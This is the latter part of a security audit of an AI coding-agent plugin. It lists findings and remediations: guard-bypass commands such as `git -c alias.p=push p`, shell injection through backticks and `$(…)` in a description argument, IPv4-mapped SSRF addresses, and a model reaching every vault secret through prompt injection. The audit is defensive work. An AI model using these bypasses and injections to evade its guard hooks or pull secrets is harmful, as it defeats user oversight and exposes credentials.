| L3 | **Guard bypasses for documented intents:** `git stage -A` (sweeping stage), `git -c alias.p=push p` (push), `vault.mjs delete` (no rule at all). | `rules.mjs:1103`; `poc/guard-probe.mjs` |
| L4 | **`--config.dangerously-allow-all-builds=true` on pnpm 11** runs every transitive postinstall script in each new project. | `bootstrap-init.mjs:426-427` (rationale at `:272-288`) |
| L5 | **Bitwarden CLI on Linux/macOS (no-Homebrew path) is downloaded with no checksum** through a code path marked untested. | `vault/install-bw.mjs:151-160`; `SECURITY.md:48-53` |
| L6 | **No CI.** The release gate runs only on the maintainer's machine, so a fork or PR gets no automatic verification. | `RELEASE.md:263-267,316`; no `.github/` |

### Remediation (in severity order)

**F1: pre-approved Bash**
1. Remove `allowed-tools` from all skills, or scope each entry to the exact commands the skill runs, for example `Bash(node *scripts/vault/vault.mjs get *)` or `Bash(node *scripts/push-env-vars.mjs *)`.
2. Add `disable-model-invocation: true` to destructive or outward-facing public skills (`delete-project`, `save-project`, `rotate-secret`, `update-hypervibe`) so only the user can start them.
3. Fix `test-security-claims.mjs:144-145` to *fail* on unscoped `Bash` in `allowed-tools`.
4. Correct `SECURITY.md:24-27`.

**F2: vault exfiltration**
1. Write the session file with `{ mode: 0o600 }` (`interactive.mjs:270`) and create `~/.hypervibe` with `0o700`. Tighten existing files on read.
2. Shorten the session TTL, or unlock per skill run.
3. Stop offering a print-to-stdout `get` to the model. Expose task-specific commands that consume the secret internally, as `setup-db.mjs` already does (`setup-db.mjs:58-67`), and have the guard *ask* on any direct `vault.mjs get|delete` and on reads of `~/.hypervibe/bw-session`.
4. Add a guard rule that asks when a command both reads a secret source and makes a network call.
5. Document plainly that a prompt injection in the session can reach every vault key.

**F3: shell injection via the description**
1. Replace `run()` and `runSibling()` in `bootstrap-init.mjs` with the argv-safe `runNode()` / `runCli()` from `scripts/_spawn.mjs:59-66`, and drop the hand-quoting at `:950-951`.
2. Apply the same change to the other `shell: true` runners listed in 3.1.
3. Add a regression test that feeds `` ` ``, `$(…)` and `$5` through `--description`.

**F4: guard-invisible deploys in `bootstrap-init.mjs`**
1. Add a guard rule that *asks* for `bootstrap-init.mjs` unless `--skip-deploy` is set, as rules 9 and 9 bis already do for `ensure.mjs` and `register.mjs` (`rules.mjs:2163-2222`).
2. Always ask when `--public` is set.
3. Alternatively, have the script stop before `ghRepo`, `deploy` and `verifyAutoDeploy` and let the skill run those commands visibly, so the existing rules apply.
4. Replace `git add -A` with an explicit file list or `git add -- .` after a clean-tree check, and update the README table.

**F5: generated agent**
1. Normalise IPs before classification. Use `net.BlockList` (or `ipaddr.js`), unwrap IPv4-mapped and NAT64 addresses, and block multicast and reserved ranges.
2. Pin the resolved address for the actual connection (for example an undici `Agent` with a custom `lookup`) to close DNS-rebinding TOCTOU.
3. In `db-query.ts`, pass the abort signal or set `statement_timeout` server-side.
4. Run agent queries through a dedicated read-only Postgres role (`default_transaction_read_only = on`, `SELECT` grants only) instead of a keyword filter.

**L1–L6**
- L1: refuse when the expected hash is unavailable, unless the user passes `--allow-unverified`. Verify the SSH tag signature against the pinned key in SECURITY.md.
- L2: keep the admin token in the vault, not in rc files.
- L3: extend `addSweeps` to `stage`, read `-c alias.*`, and add a vault rule.
- L4: prefer pnpm 11's `allowBuilds` allowlist over `dangerously-allow-all-builds`.
- L5: verify a pinned hash or a GitHub artifact attestation.
- L6: add a GitHub Actions workflow running `node scripts/tests/run-all.mjs`.

---

## 5. Ambiguities and limits of this review

- **Which path loads a skill decides whether `allowed-tools` applies.** Bootstrap tells the model to `Read` the child `SKILL.md` (`bootstrap/SKILL.md:510-512`). Elsewhere the prose says "invoke **`_x`**". The pre-approval in F1 attaches only when the Skill tool invokes the skill. A child skill that is merely read does not grant anything. In practice the model can do either, so F1's exposure depends on model behaviour.
- **Hook vs. pre-approval precedence.** I assume, per Claude Code's hook documentation, that a hook `ask` or `deny` still applies to a pre-approved tool. This is why F1 is limited to commands the guard does not match. I did not test it on a live Claude Code session here.
- **The session file mode depends on the user's umask.** 0644 is the common default on macOS and Linux. On Windows, ACLs on the user profile apply instead.
- **SSRF reachability (F5a) was not exercised.** The guard misclassification is proven. Whether Render's runtime connects to `::ffff:127.0.0.1` depends on its dual-stack configuration, which I did not test.
- **The plugin's behaviour is largely prose.** What the model actually does depends on the model and the host. I assessed what the prose instructs and what the code enforces, not observed transcripts.
- **Unread areas.** I read the guard, bootstrap, vault, update, shared-worker control plane and agent template in full. I did not read every `_dns-*` registrar skill, every `templates/` UI file, or `delete-project`'s full discovery logic. They were covered by grep sweeps for shell, network, fs and eval patterns only.
- **Fork vs. upstream.** The analysis is of the fork at `984ab56`. I did not verify it is byte-identical to the upstream tag `v3.4.12` or check its signature.
